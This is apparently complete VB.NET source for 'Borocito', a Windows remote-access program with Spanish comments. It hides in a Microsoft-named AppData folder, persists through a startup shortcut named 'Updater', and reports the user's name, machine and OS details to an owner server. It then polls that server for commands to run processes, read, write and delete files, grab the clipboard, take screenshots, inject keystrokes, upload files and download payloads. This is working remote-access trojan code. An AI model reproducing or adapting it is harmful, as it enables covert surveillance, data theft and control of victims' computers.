Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public HttpOwnerServer As String
End Module
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Borocito.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
    Function CreateRandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module Memory
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
    Public OwnerServer As String
    Public UID As String
    Sub SaveRegedit()
        Try
            AddToLog("SaveRegedit@Memory", "Saving data...", False)
            regKey.SetValue("UID", UID, RegistryValueKind.String)
            LoadRegedit()
        Catch ex As Exception
            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            OwnerServer = regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
            HttpOwnerServer = "http://" & OwnerServer
        Catch ex As Exception
            AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", "Borocito " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            'Iniciar desde otra ubicacion
            RunFromLocation()
            'Evita multi-instancias
            OnlyOneInstance()
            'Iniciar con Windows
            StartWithWindows()
            'Iniciar con Administrador
            StartWithAdmin()
            'Ver si ha existido
            If AlreadyExist() Then
                'Ya ha existido
                LoadRegedit()
                'Actualizaciones de telemtria
                StartRefreshTelemetry(True)
                'Lee los archivos de configuracion del servidor
                ServerConfigFiles()
                'iniciar todo lo demas.
                '   Escuchar comandos desde el servidor
                CommandListenerManager(True)
                '   Escuchar configuracion de UID
                ConfigFileListenerManager(True)
            Else
                'No ha existido
                'Crear UID
                UID = CreateRandomString(15)
                'Guarda la UID
                SaveRegedit()
                'Reportar al servidor
                ReportMeToServer()
                'Guardar existencia
                SetExistence()
                'Enviar telemetria
                SendFirstTelemetry()
                'Reiniciar
                RestartBorocito()
            End If
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub OnlyOneInstance()
        Try
            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
            If p.Count > 1 Then
                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
                End
            Else
                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
            End If
        Catch ex As Exception
            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Microsoft") = False Then
                AddToLog("RunFromLocation@StartUp", "Running from " & Application.ExecutablePath, True)
                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\Borocito.exe")
                Process.Start(DIRCommons & "\Borocito.exe", parameters)
                End
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function AlreadyExist() As Boolean
        AddToLog("AlreadyExist@StartUp", "Checking if exist", False)
        Try
            If regKey Is Nothing Then
                AddToLog("AlreadyExist@StartUp", "I dont exist.", False)
                Return False
            Else
                If regKey.GetValue("UID") = Nothing Then
                    AddToLog("AlreadyExist@StartUp", "I exist, but badly borned.", False)
                    Return False
                Else
                    AddToLog("AlreadyExist@StartUp", "Already exist. Im here!", False)
                    Return True
                End If
                Return False
            End If
        Catch ex As Exception
            AddToLog("AlreadyExist@StartUp", "Error: " & ex.Message, True)
            Return False
        End Try
    End Function
    Sub RestartBorocito()
        Try
            AddToLog("RestartBorocito@StartUp", "Restarting...", False)
            Process.Start(Application.ExecutablePath)
            End
        Catch ex As Exception
            AddToLog("RestartBorocito@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetExistence()
        Try
            AddToLog("SetExistence@StartUp", "Setting the existente in the Windows Registry", False)
            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
            regKey.SetValue("UID", UID, RegistryValueKind.String)
        Catch ex As Exception
            AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithWindows()
        Try
            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe") Then
            '    My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            'End If
            'My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            'If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat") = False Then
            '    Dim CMDContent As String = "@echo off" &
            '    vbCrLf & "title Borocito CLI" &
            '    vbCrLf & "cd " & """" & DIRCommons & """" &
            '    vbCrLf & "start " & "BorocitoUpdater.exe" &
            '    vbCrLf & "exit"
            '    My.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.bat", CMDContent, False, System.Text.Encoding.ASCII)
            'End If
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
                'Shortcut.Arguments = " /StartBorocito"
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Updater software for Borocito"
                Shortcut.Save()
                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            End If
        Catch ex As Exception
            AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithAdmin()
        Try

        Catch ex As Exception
            AddToLog("StartWithAdmin@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Dim refreshTelemetryThread As Thread = New Thread(New ThreadStart(AddressOf SendRefreshTelemetry))
    Dim IsrefreshTelemetryThreadRunning As Boolean = False
    Dim IsCommandReaderThreadRunning As Boolean = False
    Dim IsConfigReaderThreadRunning As Boolean = False
    Dim ThreadReadCMDServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadCommandFile))
    Dim ThreadReadGeneralConfigServer As Threading.Thread = New Thread(New ThreadStart(AddressOf ReadConfigFile))
    Sub ReportMeToServer()
        Try
            Dim reportContent As String = "#New User Report " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & " Version: " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" &
                vbCrLf & "[User]" &
                vbCrLf & "Status=" & "True" &
                vbCrLf & "Name=" & Environment.UserName &
                vbCrLf & "UID=" & UID &
                vbCrLf & "PC=" & Environment.UserDomainName &
                vbCrLf & "InternalIP=" & "" &
                vbCrLf & "Language=" & My.Computer.Info.InstalledUICulture.NativeName &
                vbCrLf & "Account=" & My.User.Name &
                vbCrLf & "[PC]" &
                vbCrLf & "OS=" & My.Computer.Info.OSFullName & " " & My.Computer.Info.OSVersion &
                vbCrLf & "RAM=" & My.Computer.Info.TotalPhysicalMemory &
                vbCrLf & "Screen=" & My.Computer.Screen.Bounds.ToString & " | (Working area: " & My.Computer.Screen.WorkingArea.ToString & ")" &
                vbCrLf & vbCrLf & vbCrLf
            Dim tlmReviewed As String = reportContent
            If tlmReviewed.Contains("&") Then
                tlmReviewed = tlmReviewed.Replace("&", "(AndSymb)")
            End If
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/userReport.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & tlmReviewed
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("ReportMeToServer@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("ReportMeToServer(CreateUser)@Network", "Error: " & ex.Message, True)
            Uninstall()
        End Try
        Try
            'Create CMD file on server
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" &
                vbCrLf & "[Response]" &
                vbCrLf
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("CreateCMDFile@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("ReportMeToServer(CreateCMD)@Network", "Error: " & ex.Message, True)
            Uninstall()
        End Try
    End Sub
    Sub SendFirstTelemetry()
        Try
            Dim reportContent As String = tlmContent
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & reportContent
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
            tlmContent = Nothing
        Catch ex As Exception
            AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendTelemetry()
        Try
            AddToLog("Network", "Sending telemetry...", False)
            Dim reportContent As String = tlmContent
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Telemetry/tlmRefresh.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&log=" & reportContent
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            response.Close()
            tlmContent = Nothing
        Catch ex As Exception
            AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendCustomTelemetryFile(ByVal filePath As String, Optional ByVal serverPost As String = Nothing)
        Try
            AddToLog("SendCustomTelemetryFile@Network", "Sending file to telemetry...", False)
            If serverPost = Nothing Then
                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
            Else
                My.Computer.Network.UploadFile(filePath, serverPost)
            End If
            AddToLog("SendCustomTelemetryFile@Network", "A file was sended as telemetry. " & filePath.Remove(0, filePath.LastIndexOf("\") + 1), False)
        Catch ex As Exception
            AddToLog("SendCustomTelemetryFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartRefreshTelemetry(ByVal StartIt As Boolean)
        Try
            If StartIt Then
                'Se inicia
                If IsrefreshTelemetryThreadRunning Then
                    refreshTelemetryThread.Resume()
                Else
                    refreshTelemetryThread.Start()
                    IsrefreshTelemetryThreadRunning = True
                End If
            Else
                'Se detiene
                refreshTelemetryThread.Suspend()
            End If
        Catch ex As Exception
            AddToLog("StartRefreshTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendRefreshTelemetry()
        Try
            While True
                Thread.Sleep(1800000) '30 minutos
                SendTelemetry()
            End While
        Catch ex As Exception
            AddToLog("SendRefreshTelemetry@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SendCommandResponse(Optional ByVal CMDResponse As String = Nothing)
        Try
            AddToLog("SendCommandResponse@Network", "Sending: " & CMDResponse, False)
            Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
            request.Method = "POST"
            Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                vbCrLf & "Command1>" &
                vbCrLf & "Command2>" &
                vbCrLf & "Command3>" &
                vbCrLf & "[Response]" &
                vbCrLf & CMDResponse
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            AddToLog("SendCommandResponse@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
            'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
            'End If
            response.Close()
        Catch ex As Exception
            AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommandListenerManager(ByVal active As Boolean)
        Try
            If active Then
                'Activo
                If IsCommandReaderThreadRunning Then
                    ThreadReadCMDServer.Resume()
                Else
                    ThreadReadCMDServer.Start()
                    IsCommandReaderThreadRunning = True
                End If
            Else
                'Inactivo
                ThreadReadCMDServer.Suspend()
            End If
        Catch ex As Exception
            AddToLog("CommandListenerManager@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ConfigFileListenerManager(ByVal active As Boolean)
        Try
            'If active Then
            '    'Activo
            '    If IsConfigReaderThreadRunning Then
            '        ThreadReadGeneralConfigServer.Resume()
            '    Else
            '        ThreadReadGeneralConfigServer.Start()
            '        IsConfigReaderThreadRunning = True
            '    End If
            'Else
            '    'Inactivo
            '    ThreadReadGeneralConfigServer.Suspend()
            'End If
        Catch ex As Exception
            AddToLog("ConfigFileListenerManager@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadCommandFile()
        While True
            Try
                Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]Command.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                Thread.Sleep(5000) '5 segundos (despues deben ser 10)
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                'Leer
                Dim TextBoxVR As New TextBox With {
                    .Text = My.Computer.FileSystem.ReadAllText(LocalCommandFile)
                }
                Dim Lineas = TextBoxVR.Lines
                Dim tempString As String = Nothing
                Dim CommandResponse As String = Nothing

                Dim CMD1 As String = Lineas(1).Split(">"c)(1).Trim() 'Es el comando principal en crudo
                Dim CMD2 As String = Lineas(2).Split(">"c)(1).Trim()
                Dim CMD3 As String = Lineas(3).Split(">"c)(1).Trim()

                If CMD1 <> Nothing Then
                    Dim CommandCMD As String = CMD1
                    AddToLog("ReadCommandFile@Network", "Processing: " & CMD1)
                    Try
                        If CommandCMD.Contains("=") Then
                            CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
                        End If
                        If CommandCMD.Contains("%username%") Then
                            CommandCMD = CommandCMD.Replace("%username%", Environment.UserName)
                        End If
                        If CMD1.Contains("MsgBox=") Then
                            Dim Arg() As String = CommandCMD.Split(",")
                            If My.Computer.FileSystem.FileExists(DIRTemp & "\MessageBoxBRO.vbs") Then
                                My.Computer.FileSystem.DeleteFile(DIRTemp & "\MessageBoxBRO.vbs")
                            End If
                            My.Computer.FileSystem.WriteAllText(DIRTemp & "\MessageBoxBRO.vbs", "a = MsgBox(" & """" & Arg(0) & """" & "," & Arg(1) & "," & """" & Arg(2) & """" & ")", False, Encoding.ASCII)
                            Process.Start(DIRTemp & "\MessageBoxBRO.vbs")

                        ElseIf CMD1 = "/Pause=" Then
                            SendCommandResponse("Borocito has been to pause for '" & CommandCMD & "' ms")
                            Threading.Thread.Sleep(CommandCMD)

                        ElseIf CMD1 = "/Memory.Save()" Then
                            SaveRegedit()
                        ElseIf CMD1 = "/Memory.Load()" Then
                            LoadRegedit()

                            '<--- Windows --->
                        ElseIf CMD1.Contains("/Windows.Process.Start=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            Process.Start(Arg(0), Arg(1))

                        ElseIf CMD1.Contains("/Windows.Process.Stop=") Then 'Funciona.
                            Dim proc = Process.GetProcessesByName(CommandCMD)
                            For i As Integer = 0 To proc.Count - 1
                                proc(i).CloseMainWindow()
                            Next i

                        ElseIf CMD1.Contains("/Windows.Process.Get()") Then 'Funciona.
                            Dim p As Process
                            For Each p In Process.GetProcesses()
                                If Not p Is Nothing Then
                                    tempString = tempString & p.ProcessName & vbCrLf
                                End If
                            Next
                            CommandResponse = tempString

                        ElseIf CMD1.Contains("/Windows.FileSystem.GetDirectory=") Then 'Funciona.
                            For Each DIR As String In My.Computer.FileSystem.GetDirectories(CommandCMD, FileIO.SearchOption.SearchAllSubDirectories)
                                tempString = tempString & DIR & vbCrLf
                            Next
                            CommandResponse = tempString

                        ElseIf CMD1.Contains("/Windows.FileSystem.GetFiles=") Then 'Funciona.
                            For Each FILE As String In My.Computer.FileSystem.GetFiles(CommandCMD, FileIO.SearchOption.SearchAllSubDirectories)
                                tempString = tempString & FILE & vbCrLf
                            Next
                            CommandResponse = tempString

                        ElseIf CMD1.Contains("/Windows.FileSystem.Read=") Then 'Funciona.
                            tempString = My.Computer.FileSystem.ReadAllText(CommandCMD)
                            CommandResponse = tempString

                        ElseIf CMD1.Contains("/Windows.FileSystem.Write=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            My.Computer.FileSystem.WriteAllText(Arg(0), Arg(1), False)

                        ElseIf CMD1.Contains("/Windows.FileSystem.DirCreate=") Then 'Funciona.
                            My.Computer.FileSystem.CreateDirectory(CommandCMD)

                        ElseIf CMD1.Contains("/Windows.FileSystem.Delete=") Then 'Funciona.
                            Try
                                My.Computer.FileSystem.DeleteFile(CommandCMD)
                            Catch
                            End Try
                            Try
                                My.Computer.FileSystem.DeleteDirectory(CommandCMD, FileIO.DeleteDirectoryOption.DeleteAllContents)
                            Catch
                            End Try

                        ElseIf CMD1.Contains("/Windows.Clipboard.Get()") Then 'No funciona
                            CommandResponse = My.Computer.Clipboard.GetText()

                        ElseIf CMD1.Contains("/Windows.System.GetHost()") Then 'Funciona.
                            tempString = vbCrLf
                            Dim MI_HOST As String
                            MI_HOST = Dns.GetHostName()
                            Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
                            tempString = tempString & MI_HOST & vbCrLf
                            For I = 0 To MIS_IP.Length - 1
                                tempString = tempString & MIS_IP(I).ToString & vbCrLf
                            Next
                            CommandResponse = tempString

                            '<--- Payloads --->
                        ElseIf CMD1.Contains("/Payloads.DownloadComponent=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            Payloads.DownloadComponent(Arg(0), Arg(1), Boolean.Parse(Arg(2)), Arg(3), Arg(4))

                        ElseIf CMD1.Contains("/Payloads.Upload.File=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            Payloads.uploadAfile(Arg(0), Arg(1))

                        ElseIf CMD1.Contains("/Payloads.SendTheKeys=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            Payloads.SendTheKeys(Arg(0), Arg(1))

                        ElseIf CMD1.Contains("/Payloads.TakeScreenshot()") Then 'Funciona.
                            Payloads.TakeAnScreenshot()
                        ElseIf CMD1.Contains("/Payloads.Inputs=") Then 'Funciona.
                            Payloads.Inputs(CommandCMD)
                        ElseIf CMD1.Contains("/Payloads.PostNotify=") Then 'Funciona.
                            Dim Arg() As String = CommandCMD.Split(",")
                            Payloads.PostNotify(Arg(0), Arg(1), Arg(2), Arg(3), Arg(4))

                            '<--- Borocito Tools --->
                        ElseIf CMD1.Contains("/Stop") Then 'Funciona.
                            SendCommandResponse("Borocito has been called to close")
                            AddToLog("Network", "Borocito has been called to close!", True)
                            SendTelemetry()
                            End

                        ElseIf CMD1.Contains("/Restart") Then 'Funciona.
                            SendCommandResponse("Borocito has been called to restart")
                            AddToLog("Network", "Borocito has been called to restart!", True)
                            SendTelemetry()
                            Restart()

                        ElseIf CMD1.Contains("/Uninstall") Then 'Funciona.
                            SendCommandResponse("Borocito has been called to uninstall!")
                            AddToLog("Network", "Borocito has been called to uninstall!", True)
                            SendTelemetry()
                            Uninstall()

                        ElseIf CMD1.Contains("/Update") Then 'Funciona.
                            SendCommandResponse("Borocito has been called to Update")
                            AddToLog("Network", "Borocito has been called to Update!", True)
                            SendTelemetry()
                            Update()

                        ElseIf CMD1.Contains("/ForceUpdate") Then
                            SendCommandResponse("Borocito has been called to Force the Update")
                            AddToLog("Network", "Borocito has been called to Force the Update!", True)
                            SendTelemetry()
                            Update("/ForceUpdate")

                        ElseIf CMD1.Contains("/Reset") Then 'Funciona.
                            SendCommandResponse("Borocito has been called to Reset")
                            AddToLog("Network", "Borocito has been called to Reset!", True)
                            SendTelemetry()
                            Extractor()

                        ElseIf CMD1.Contains("/SendTelemetry") Then 'Funciona.
                            CommandResponse = "Sending located telemetry..."
                            AddToLog("Network", "Borocito has been called to send telemetry!", True)
                            SendTelemetry()

                        ElseIf CMD1.Contains("/Heartbeat") Then 'Funciona.
                            CommandResponse = "---/\--- (Pum pum...)"
                            AddToLog("Network", "Hey, Im here!", True)

                        ElseIf CMD1.Contains("/Status") Then 'Funciona.
                            CommandResponse = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & "). Running in " & Environment.UserDomainName & "\" & Environment.UserName

                        ElseIf CMD1.StartsWith("boro-get") Then
                            CommandResponse = BORO_GET_ADMIN(CMD1)

                        End If
                    Catch ex As Exception
                        CommandResponse = "[" & CMD1 & "]Error: " & ex.Message
                        AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
                    End Try
                    If CMD1 = Nothing Then
                    Else
                        If CommandResponse = Nothing Then
                            SendCommandResponse("Ejecuted " & CMD1 & " " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy")) 'ENVIAR RESPUESTA
                        Else
                            SendCommandResponse(CommandResponse)
                        End If
                    End If
                End If
            Catch ex As Exception
                AddToLog("ReadCommandFile@Network", "Error: " & ex.Message, True)
            End Try
        End While
    End Sub
    Sub ReadConfigFile()
        Try
            'Hola querido, resulta que esto todavia no esta programado porque
            'forma parte de una actualizacion que esta muy, muy, pero muy en el futuro.
            '(si aplica, puede que no lo haga)
        Catch ex As Exception
            AddToLog("ReadConfigFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ServerConfigFiles()
        AddToLog("ServerConfigFiles@Network", "Reading server configuration...")
        Try
            'Verificar que el fichero no exista en local
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Client.ini") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Client.ini")
            End If
            If My.Computer.FileSystem.FileExists(DIRCommons & "\General.ini") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\General.ini")
            End If
            'Descargar el fichero desde el servidor
            My.Computer.Network.DownloadFile(HttpOwnerServer & "/Client.ini", DIRCommons & "\Client.ini")
            My.Computer.Network.DownloadFile(HttpOwnerServer & "/GlobalSettings.ini", DIRCommons & "\General.ini")
        Catch ex As Exception
            AddToLog("ConfigFiles@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module